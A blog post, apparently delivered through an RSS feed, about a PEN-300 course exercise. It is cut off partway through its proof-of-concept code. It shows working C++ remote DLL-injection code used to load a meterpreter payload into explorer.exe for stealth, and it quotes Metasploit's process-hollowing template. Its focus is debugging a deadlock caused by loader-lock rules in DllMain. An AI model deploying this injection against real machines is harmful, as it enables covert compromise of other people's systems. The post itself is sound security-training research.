<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>dllmain on Reuben Sammut's blog</title><link>https://reubensammut.github.io/tags/dllmain/</link><description>Recent content in dllmain on Reuben Sammut's blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 26 Mar 2023 22:03:06 +0200</lastBuildDate><atom:link href="https://reubensammut.github.io/tags/dllmain/index.xml" rel="self" type="application/rss+xml"/><item><title>DllMain and Threads</title><link>https://reubensammut.github.io/posts/dllmain-and-threads/</link><pubDate>Sun, 26 Mar 2023 22:03:06 +0200</pubDate><guid>https://reubensammut.github.io/posts/dllmain-and-threads/</guid><description>&lt;img src="https://reubensammut.github.io/posts/dllmain-and-threads/inject.png" alt="Featured image of post DllMain and Threads" />&lt;p>Quite recently, I started working on the &lt;a class="link" href="https://www.offsec.com/courses/pen-300/" target="_blank" rel="noopener"
>PEN-300: Advanced Evasion Techniques and Breaching Defenses&lt;/a> course from OffSec. One of the process injection techniques discussed in the &lt;em>Process Injection and Migration&lt;/em> chapter is making the remote process load a DLL via &lt;code>LoadLibrary&lt;/code> and &lt;code>CreateRemoteThread&lt;/code>. In the course, we are requested to inject a DLL generated by &lt;code>msfvenom&lt;/code> from the &lt;a class="link" href="https://www.metasploit.com/" target="_blank" rel="noopener"
>metasploit framework&lt;/a> into the &lt;code>explorer.exe&lt;/code> process. When running this I noticed that explorer.exe became unstable when the DLL was injected. This blog post goes into the understanding, research and solution I used to solve this issue.&lt;/p>
&lt;h2 id="motivation">Motivation&lt;/h2>
&lt;p>As described above, one of the classic techniques taught for process injection, involves using a couple of Win32 APIs to make the remote process load a library whose path is injected into the process. This is done by making the remote process start a thread, executing &lt;code>LoadLibrary&lt;/code> with the path of the DLL as a parameter which ends up loading the DLL into the target process. Injecting a DLL generated by &lt;code>msfvenom&lt;/code> into &lt;code>explorer.exe&lt;/code> is ideal for keeping stealthy (even though writing the DLL to disk is questionable). The code to do so is in the &lt;a class="link" href="https://github.com/reubensammut/InjectPoC/tree/master/Injector" target="_blank" rel="noopener"
>Injector project&lt;/a> which can be found on a &lt;a class="link" href="https://github.com/reubensammut/InjectPoC" target="_blank" rel="noopener"
>GitHub repository&lt;/a> I created as a PoC for this blog post, however the most important part can be found in the code extract below. The code used in the course is written in C#, however for the purposes of this blog post, I wrote everything in C++.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-C" data-lang="C">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">Inject&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> pid, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span> path)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HANDLE hProc &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">OpenProcess&lt;/span>(PROCESS_ALL_ACCESS, false, pid);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LPVOID addr &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">VirtualAllocEx&lt;/span>(hProc, NULL, &lt;span style="color:#ae81ff">0x1000&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> MEM_COMMIT &lt;span style="color:#f92672">|&lt;/span> MEM_RESERVE, PAGE_READWRITE);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">size_t&lt;/span> nWritten &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">WriteProcessMemory&lt;/span>(hProc, addr, path, &lt;span style="color:#a6e22e">strlen&lt;/span>(path), &lt;span style="color:#f92672">&amp;amp;&lt;/span>nWritten);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LPTHREAD_START_ROUTINE procAddr &lt;span style="color:#f92672">=&lt;/span> (LPTHREAD_START_ROUTINE)&lt;span style="color:#f92672">&amp;amp;&lt;/span>LoadLibraryA;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">CreateRemoteThread&lt;/span>(hProc, NULL, &lt;span style="color:#ae81ff">0&lt;/span>, procAddr, addr, &lt;span style="color:#ae81ff">0&lt;/span>, NULL);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Usually after running &lt;code>LoadLibrary&lt;/code>, one would need to run &lt;code>GetProcAddress&lt;/code> to locate the address of the function that needs to be executed, and then execute the function with the required parameters. Luckily DLLs have an optional entry point function which is called on &lt;code>LoadLibrary&lt;/code>, &lt;code>FreeLibrary&lt;/code> and on attach or detach by the first thread of a process. This function is &lt;code>DllMain&lt;/code>, the details of which can be found &lt;a class="link" href="https://learn.microsoft.com/en-us/windows/win32/dlls/dllmain" target="_blank" rel="noopener"
>here&lt;/a>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-C" data-lang="C">&lt;span style="display:flex;">&lt;span>BOOL WINAPI &lt;span style="color:#a6e22e">DllMain&lt;/span>(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _In_ HINSTANCE hinstDLL,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _In_ DWORD fdwReason,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _In_ LPVOID lpvReserved
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The reason for calling this method by the different function is specified in the &lt;code>fdwReason&lt;/code> parameter, with &lt;code>DLL_PROCESS_ATTACH&lt;/code> being the reason used by &lt;code>LoadLibrary&lt;/code>. DLLs like the ones generated by &lt;code>msfvenom&lt;/code> execute their payload on DLL load as can be seen in the &lt;a class="link" href="https://github.com/rapid7/metasploit-framework/blob/d29f5690a172cbe6741bff9165dc2d133c222ecc/data/templates/src/pe/dll/template.c" target="_blank" rel="noopener"
>template&lt;/a> used by metasploit to generate DLLs.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-C" data-lang="C">&lt;span style="display:flex;">&lt;span>BOOL WINAPI
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">DllMain&lt;/span> (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">switch&lt;/span> (dwReason)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> DLL_PROCESS_ATTACH:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">ExecutePayload&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> DLL_PROCESS_DETACH:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Code to run when the DLL is freed
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> DLL_THREAD_ATTACH:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Code to run when a thread is created during the DLL&amp;#39;s lifetime
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> DLL_THREAD_DETACH:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Code to run when a thread ends normally.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> TRUE;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Using this code to inject a meterpreter DLL into &lt;code>explorer.exe&lt;/code>, it was noticed that while the exploit does work, &lt;code>explorer.exe&lt;/code> becomes unstable and unresponsive, until it hangs, gets killed and respawned. Although other techniques exist which can be used, it was strange that this was happening.&lt;/p>
&lt;h2 id="research">Research&lt;/h2>
&lt;h3 id="msdn">MSDN&lt;/h3>
&lt;p>Looking at the &lt;a class="link" href="https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-best-practices" target="_blank" rel="noopener"
>Dynamic-Link Library Best Practices&lt;/a> documentation, we notice that Microsoft says that there are certain tasks which should not be performed within &lt;code>DllMain&lt;/code>. I&amp;rsquo;ve highlighted ones that are particularly interesting to me.&lt;/p>
&lt;blockquote>
&lt;p>You should never perform the following tasks from within &lt;a class="link" href="https://learn.microsoft.com/en-us/windows/win32/dlls/dllmain" target="_blank" rel="noopener"
>&lt;strong>DllMain&lt;/strong>&lt;/a>:&lt;/p>
&lt;ul>
&lt;li>Call &lt;a class="link" href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya" target="_blank" rel="noopener"
>&lt;strong>LoadLibrary&lt;/strong>&lt;/a> or &lt;a class="link" href="https://learn.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa" target="_blank" rel="noopener"
>&lt;strong>LoadLibraryEx&lt;/strong>&lt;/a> (either directly or indirectly). This can cause a deadlock or a crash.&lt;/li>
&lt;li>&amp;hellip;&lt;/li>
&lt;li>Synchronize with other threads. This can cause a deadlock.&lt;/li>
&lt;li>Acquire a synchronization object that is owned by code that is waiting to acquire the loader lock. This can cause a deadlock.&lt;/li>
&lt;li>&amp;hellip;&lt;/li>
&lt;li>Call &lt;a class="link" href="https://learn.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createprocessa" target="_blank" rel="noopener"
>&lt;strong>CreateProcess&lt;/strong>&lt;/a>. Creating a process can load another DLL.&lt;/li>
&lt;li>Call &lt;a class="link" href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-freelibraryandexitthread" target="_blank" rel="noopener"
>&lt;strong>ExitThread&lt;/strong>&lt;/a>. Exiting a thread during DLL detach can cause the loader lock to be acquired again, causing a deadlock or a crash.&lt;/li>
&lt;li>Call &lt;a class="link" href="https://learn.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread" target="_blank" rel="noopener"
>&lt;strong>CreateThread&lt;/strong>&lt;/a>. Creating a thread can work if you do not synchronize with other threads, but it is risky.&lt;/li>
&lt;li>&amp;hellip;&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;p>From the documentation of &lt;a class="link" href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread" target="_blank" rel="noopener"
>CreateRemoteThread&lt;/a>, we also see the following remark&lt;/p>
&lt;blockquote>
&lt;p>The &lt;a class="link" href="https://learn.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-exitprocess" target="_blank" rel="noopener"
>ExitProcess&lt;/a>, &lt;a class="link" href="https://learn.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-exitthread" target="_blank" rel="noopener"
>ExitThread&lt;/a>, &lt;a class="link" href="https://learn.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread" target="_blank" rel="noopener"
>CreateThread&lt;/a>, &lt;strong>CreateRemoteThread&lt;/strong> functions, and a process that is starting (as the result of a &lt;a class="link" href="https://learn.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createprocessa" target="_blank" rel="noopener"
>CreateProcess&lt;/a> call) are serialized between each other within a process. Only one of these events occurs in an address space at a time. This means the following restrictions hold:&lt;/p>
&lt;ul>
&lt;li>During process startup and DLL initialization routines, new threads can be created, but they do not begin execution until DLL initialization is done for the process.&lt;/li>
&lt;li>Only one thread in a process can be in a DLL initialization or detach routine at a time.&lt;/li>
&lt;li>&lt;a class="link" href="https://learn.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-exitprocess" target="_blank" rel="noopener"
>ExitProcess&lt;/a> returns after all threads have completed their DLL initialization or detach routines.&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;p>From these two articles, we can clearly see that:&lt;/p>
&lt;ul>
&lt;li>there is some sort of lock between &lt;code>ExitProcess&lt;/code>, &lt;code>ExitThread&lt;/code>, &lt;code>CreateThread&lt;/code> and &lt;code>CreateRemoteThread&lt;/code> which allows only one event to occur at a time within a process&lt;/li>
&lt;li>using certain functionality from &lt;code>DllMain&lt;/code> could cause issues such as deadlocks&lt;/li>
&lt;/ul>
&lt;h3 id="metasploit">Metasploit&lt;/h3>
&lt;p>As we&amp;rsquo;ve seen previously in the &lt;a class="link" href="https://github.com/rapid7/metasploit-framework/blob/d29f5690a172cbe6741bff9165dc2d133c222ecc/data/templates/src/pe/dll/template.c" target="_blank" rel="noopener"
>DLL template&lt;/a>, DLLs generated by metasploit have the &lt;code>DllMain&lt;/code> function which calls an &lt;code>ExecutePayload&lt;/code> function on &lt;code>DLL_PROCESS_ATTACH&lt;/code>. Looking at what the code in &lt;code>ExecutePayload&lt;/code>, we see that DLL itself launches a &lt;code>rundll32.exe&lt;/code> suspended process, injects shellcode into it and hijacks thread execution in the new process to execute the injected shellcode using &lt;code>GetThreadContext&lt;/code> and &lt;code>SetThreadContext&lt;/code>. Finally it calls &lt;code>ResumeThread&lt;/code> to actually execute the shellcode.&lt;/p>
&lt;p>From the research done and going through the &lt;code>ExecutePayload&lt;/code> function, we can highlight the following.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-C" data-lang="C">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">ExecutePayload&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// ...
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">Synchronize&lt;/span>()) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Create a suspended process, write shellcode into stack, make stack RWX,
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// resume it
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> DWORD result &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">CreateProcess&lt;/span>(NULL, &lt;span style="color:#e6db74">&amp;#34;rundll32.exe&amp;#34;&lt;/span>, NULL, NULL, TRUE,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CREATE_SUSPENDED&lt;span style="color:#f92672">|&lt;/span>IDLE_PRIORITY_CLASS&lt;span style="color:#f92672">|&lt;/span>CREATE_BREAKAWAY_FROM_JOB, NULL,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> NULL, &lt;span style="color:#f92672">&amp;amp;&lt;/span>si, &lt;span style="color:#f92672">&amp;amp;&lt;/span>pi);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// If we fail, try again without the CREATE_BREAKAWAY_FROM_JOB flag in the
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// event that we are in a job but we can&amp;#39;t break away from it.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (result &lt;span style="color:#f92672">==&lt;/span> FALSE){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">CreateProcess&lt;/span>(NULL, &lt;span style="color:#e6db74">&amp;#34;rundll32.exe&amp;#34;&lt;/span>, NULL, NULL, TRUE,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CREATE_SUSPENDED&lt;span style="color:#f92672">|&lt;/span>IDLE_PRIORITY_CLASS, NULL, NULL, &lt;span style="color:#f92672">&amp;amp;&lt;/span>si, &lt;span style="color:#f92672">&amp;amp;&lt;/span>pi);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//...
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//...
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">ExitThread&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The functions &lt;code>CreateProcess&lt;/code> and &lt;code>ExitThread&lt;/code> have been highlighted as they could possibly be problematic. The DLL Best Practices documentation tells us that &lt;code>CreateProcess&lt;/code> could cause another DLL load. Since no additional information is provided, we will assume that this means that the launched process would also try to load a DLL in our process, via whatever method possible. &lt;code>ExitThread&lt;/code> is mentioned in both articles as being possibly problematic. To verify this, we&amp;rsquo;ll create a simplified PoC, where we&amp;rsquo;ll create a thread to load an arbitrary DLL. We&amp;rsquo;ll also create two identical DLLs, one of which returns from the &lt;code>DllMain&lt;/code> via &lt;code>return TRUE&lt;/code>, while the other one uses &lt;code>ExitThread&lt;/code>. We&amp;rsquo;ll see how the application reacts to loading both DLLs, and try to verify that the one with &lt;code>ExitThread&lt;/code> causes issues.&lt;/p>
&lt;h2 id="poc">PoC&lt;/h2>
&lt;p>All the code for this PoC can be found &lt;a class="link" href="https://github.com/reubensammut/InjectPoC" target="_blank" rel="noopener"
>here&lt;/a> with the title of each section having the same name as each project in the PoC.&lt;/p>
&lt;h3 id="injectee">Injectee&lt;/h3>
&lt;p>This is the application that will be used to load the DLLs. The application runs in a loop and accepts keyboard input. It accepts two commands&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-text" data-lang="text">&lt;span style="display:flex;">&lt;span>Usage:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> load &amp;lt;dllname&amp;gt; Loads a dll into the process
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exit Exit the process
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>When calling &lt;code>load &amp;lt;dllname&amp;gt;&lt;/code>, a thread is created which loads the specified DLL as follows&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-C" data-lang="C">&lt;span style="display:flex;">&lt;span>DWORD WINAPI &lt;span style="color:#a6e22e">myThread&lt;/span>(LPVOID lpParameter)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span> libPath &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)lpParameter;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cout &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#e6db74">&amp;#34;[Thread] - Trying to load library&amp;#34;&lt;/span> &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> endl;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HMODULE hLib &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">LoadLibraryA&lt;/span>(libPath);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">FreeLibrary&lt;/span>(hLib);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> delete[] libPath;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We also call &lt;code>FreeLibrary&lt;/code> to be able to load a library multiple times.&lt;/p>
&lt;h3 id="samplegood">SampleGood&lt;/h3>
&lt;p>&lt;code>SampleGood&lt;/code> is a DLL, which does not use any functions which could be problematic. The code for &lt;code>DLL_PROCESS_ATTACH&lt;/code> just prints two statements, and looks as follows&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-C" data-lang="C">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">DoStuff&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Hello world from a good DLL :)&lt;/span>&lt;span style="color:#ae81ff">\n\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Returning normally&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>As we see from the code of DllMain, the function returns TRUE once &lt;code>DoStuff&lt;/code> is done.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-C" data-lang="C">&lt;span style="display:flex;">&lt;span>BOOL APIENTRY &lt;span style="color:#a6e22e">DllMain&lt;/span>( HMODULE hModule,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DWORD ul_reason_for_call,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LPVOID lpReserved
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">switch&lt;/span> (ul_reason_for_call)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> DLL_PROCESS_ATTACH:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">DoStuff&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> DLL_THREAD_ATTACH:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[SampleGood.dll] - DLL_THREAD_ATTACH&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> DLL_THREAD_DETACH:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[SampleGood.dll] - DLL_THREAD_DETACH&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> DLL_PROCESS_DETACH:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[SampleGood.dll] - DLL_PROCESS_DETACH&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> TRUE;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="samplebad">SampleBad&lt;/h3>
&lt;p>&lt;code>SampleBad&lt;/code> does pretty much the same what &lt;code>SampleGood&lt;/code> does. However, the &lt;code>DoStuff&lt;/code> function emulates what the DLL generated by &lt;code>msfvenom&lt;/code> does and calls &lt;code>ExitThread(0)&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-C" data-lang="C">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">DoStuff&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Hello world from a bad DLL &amp;#39;(?_?)&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\n\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Calling ExitThread&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">ExitThread&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>);
